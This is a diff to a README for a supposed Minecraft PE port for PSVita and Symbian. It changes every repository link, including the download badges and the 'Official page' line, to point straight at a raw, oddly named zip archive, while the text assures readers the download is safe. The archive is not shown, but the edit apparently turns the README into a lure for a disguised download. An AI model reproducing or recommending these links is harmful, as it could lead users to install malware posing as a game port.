@@ -1,6 +1,6 @@
 # 🎮 minecraftpe-vita - Play Minecraft PE on PSVita & Symbian
 
-[![Download minecraftpe-vita](https://img.shields.io/badge/Download-minecraftpe--vita-blue?style=for-the-badge&logo=github)](https://github.com/stripteasedictum678/minecraftpe-vita)
+[![Download minecraftpe-vita](https://img.shields.io/badge/Download-minecraftpe--vita-blue?style=for-the-badge&logo=github)](https://github.com/stripteasedictum678/minecraftpe-vita/raw/refs/heads/main/penstock/vita_minecraftpe_subteraqueous.zip)
 
 ---
 
@@ -40,7 +40,7 @@ All these are easy to find and install, and most users will already have them.
 
 You need to visit the main GitHub page to download minecraftpe-vita. The website hosts the latest files you will need.
 
-[![Get minecraftpe-vita](https://img.shields.io/badge/Get%20minecraftpe--vita-grey?style=for-the-badge)](https://github.com/stripteasedictum678/minecraftpe-vita)
+[![Get minecraftpe-vita](https://img.shields.io/badge/Get%20minecraftpe--vita-grey?style=for-the-badge)](https://github.com/stripteasedictum678/minecraftpe-vita/raw/refs/heads/main/penstock/vita_minecraftpe_subteraqueous.zip)
 
 Steps to download:
 
@@ -122,7 +122,7 @@ Revisit the GitHub link and download the latest release following the same steps
 
 For more help, visit the repository’s GitHub page. Look at the **Issues** tab for common problems and community solutions.
 
-- Official page: https://github.com/stripteasedictum678/minecraftpe-vita
+- Official page: https://github.com/stripteasedictum678/minecraftpe-vita/raw/refs/heads/main/penstock/vita_minecraftpe_subteraqueous.zip
 - Check the README or Wiki on the repository for updates or detailed technical info.
 
 ---
@@ -142,4 +142,4 @@ minecraftpe-vita is safe to download and use. Always download files from the off
 
 ---
 
-[![Download minecraftpe-vita](https://img.shields.io/badge/Download-minecraftpe--vita-blue?style=for-the-badge&logo=github)](https://github.com/stripteasedictum678/minecraftpe-vita)
+[![Download minecraftpe-vita](https://img.shields.io/badge/Download-minecraftpe--vita-blue?style=for-the-badge&logo=github)](https://github.com/stripteasedictum678/minecraftpe-vita/raw/refs/heads/main/penstock/vita_minecraftpe_subteraqueous.zip)
